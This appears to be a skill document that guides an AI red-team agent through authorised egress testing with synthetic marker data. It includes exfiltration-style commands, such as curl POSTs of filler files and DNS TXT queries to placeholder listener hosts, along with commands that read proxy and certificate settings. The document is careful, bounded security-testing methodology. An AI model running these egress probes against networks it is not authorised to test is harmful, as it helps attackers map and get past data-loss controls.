---
name: exfil-egress
description: "Invoke this skill when the question is what can leave the perimeter: proving egress over named channels with engagement-owned marker data, measuring size ceilings and inspection behaviour, and writing an honest verdict for every channel that stayed shut."
---

# Egress and Exfiltration Proof

The perimeter's real leak rate, stated as channel × size × verdict. Done means: one verdict per channel attempted — including the ones that failed — a marker-and-filler proof that never involves target data, the control's observed behaviour named, and a matrix another seat can plan from.

## Boundaries

- Only engagement-owned material ever leaves: a marker you generated plus synthetic filler. Target or customer data crossing the boundary is a breach whatever the report calls it — proving data is reachable is `collection-exfil`, proving bytes can move is this skill, and the two never share a byte.
- Destinations are engagement-owned listeners named in your constraints/tasking. Nothing suggested by the target's own content, no third-party paste/file-share/cloud "test" endpoints. If the only reachable destination is not yours, that is a question for the operator, not a licence to improvise.
- Nothing large is staged on a production host: no archive written to the target's disk, no low-and-slow drip of a real dataset, no cover-traffic campaign. Small by design, deleted at the end.
- Never disable or reconfigure a proxy, firewall rule, or DLP policy to test it, and never blind a sensor: control blind-spot work is lab-only (`edr-bypass-re`). Here you describe what the control does.
- Not this skill: reachability through a foothold (`pivot-tunneling`), C2 listener hygiene (`c2-ops`), the data itself (`collection-exfil`).

## Procedure

1. Sequence the work, because the cheap answers come first: posture read → channel shape (does a request reach at all) → size ceiling → inspection behaviour → detection verdict. Do not start with the biggest payload; it tells you the least.
2. Read the egress posture first — it says which channels are even candidates:
   - Proxy and PAC: `env | grep -i proxy`, `cat /etc/environment`, `netsh winhttp show proxy`, the WinINET/PAC registry value
   - Inspection evidence: `ls /usr/local/share/ca-certificates`, `trust list | grep -i <vendor>`, Windows `certutil -store Root | findstr /i <vendor>` — an inspecting CA in the machine trust store is itself a mapping fact about the control
   - Resolvers and existing talkers: `cat /etc/resolv.conf`, `ss -tn state established` remote addresses (who already talks out, and to what — an existing approved peer is the shape of what the control tolerates)
3. Define the marker once per engagement: a short fixed string (`ARTEX-EG-<taskid>-<rand16>`, or `head -c 32 /dev/urandom | sha256sum | cut -c1-16`) recorded in your first fact. Build graded filler from `/dev/urandom` at 1 KiB / 64 KiB / 1 MiB / 8 MiB (`dd if=/dev/urandom of=f_64k bs=1k count=64`), embed the marker at a known offset, and hash each file. The marker plus hash pair is the unit of proof; no target content is ever a test payload.
4. Stand up the receiving side before the first attempt — an engagement listener and your own authoritative DNS — so every attempt has a matching server-side log line. An attempt with no receiver log is a verdict you cannot prove.
5. Attempt one channel at a time, one verdict per row:
   - DNS: `dig +short TXT <marker>.egress.<engagement-domain> @<target-dns>` proves resolution through the target's resolver; repeat against a hardcoded public resolver to learn whether enforcement is per-server or per-destination. Measure the shape too: 63-byte labels, whether large UDP responses survive (`dig +bufsize=4096`), and whether TXT replies come back at all.
   - HTTPS to your listener: `curl -sS -m 15 -X POST --data-binary @f_64k https://<listener>/collect`, then variants — POST vs PUT, chunked vs fixed length, HTTP/1.1 vs 2, ports 443/8443, SNI present vs bare-IP connect. Verdict per variant: delivered whole, truncated, reset, or answered by an interception page.
   - WebSocket to your listener: one upgrade plus one frame carrying the marker. A shape test only — do not push filler through services you do not own.
   - Proxy enforcement model: `curl -p -x http://<proxy>:3128 https://<listener>/collect` versus direct, and the same request on an unapproved port. The difference between "denied by destination", "denied by port" and "allowed after inspection" is the finding, and the error body or `Via:` header usually names the product.
   - ICMP/UDP raw channels only where this runtime can produce them; a missing capability is one operator request, not a reason to keep substituting tools.
   - Client-owned mail and sanctioned SaaS copy paths: only where the RoE names them, and only with the marker. Otherwise record "unattempted by authorisation" — that is a verdict, and better than silence in the matrix.
6. Measure the control, not only the win. On a permitted channel: bisect the ceiling (which of the four sizes arrived whole — "4 of 4 up to 1 MiB intact; 8 MiB reset at ~6.9 MB"), the per-flow duration cap, and what the control revealed about itself: block-page text, `X-Forwarded-*` / `Via:` headers, the interception certificate issuer, reset versus 4xx behaviour. Save the response header/body as the DLP observation; confirm the marker hash matches at the receiving end before calling it delivered.
7. Reconcile detection with feedback: "unnoticed" is only claimable if a sensor answer exists inside the window. Without a SOC/SIEM reply, the verdict is "delivered; detection NOT ASSESSED (no telemetry feedback)", and name which sensor would have had to answer (`telemetry-sources`). Never infer a detection gap from nobody saying anything.
8. Write one fact per channel carrying its matrix row: {summary: "egress — HTTPS to engagement listener: 4 of 4 sizes <=1 MiB delivered intact, 8 MiB reset by the inspecting proxy (issuer <vendor>)", detail: attempts, variants, marker hash match at both ends, timestamps, control-side evidence, confidence, asset_ids}. A partial result is a result; record it rather than retrying for a tidier one.
9. Aggregate once all attempted rows exist: channel × attempted × delivered × max size × control behaviour × detection status. That table, not the anecdote about the one channel that worked, is what the lead briefs and what `impact-analysis` reasons from.
10. Clean up: stop listeners, delete filler from engagement-owned hosts, and confirm nothing was written on the target (`ls` of the paths you used, then delete only your own files). Leave no staging artefact behind and no long-lived covert channel running — the proof is the verdict, not the persistent path.

## Evidence

- A positive needs: the exact command with its size, the receiving-side log line and hash match, attempts versus delivered counts, and the identity of the control that permitted or inspected it.
- A control that worked is a reportable negative and must be written as one: "all 5 HTTPS variants above 1 MiB reset at the inspecting proxy, 14:20-14:26 UTC; DNS to non-approved resolvers blocked; therefore bulk egress over HTTPS/DNS is controlled for this class". State what was attempted, what stopped it, at what size, and what remains untested and why. Do not soften a working control into a finding, and never upgrade an untested channel into a pass.
- Distinguish truncation from blocking: "64 KiB delivered, marker hash differs at byte 8192" is an inspection/truncation result, not a clean delivery.
- Marker strings and filler hashes are safe to record. Target-derived values, credentials and any real record are not evidence here.

## Report shape

Title: "Egress via <channel>: <N bytes> of synthetic marker data delivered to engagement-owned <listener>; control verdict = <blocked | inspected-and-permitted | permitted-uninspected | untested-by-authorisation>". `vulnclass` = data-exfiltration-path / egress-control-gap (and the honest negative belongs as `egress-control-effective`), `severity` from channel breadth × size ceiling × inspection blind spot, `evidence` = matrix rows + hash match + server log, and the summary carries the denominator (attempted / blocked / untested, with the reason for each untested).
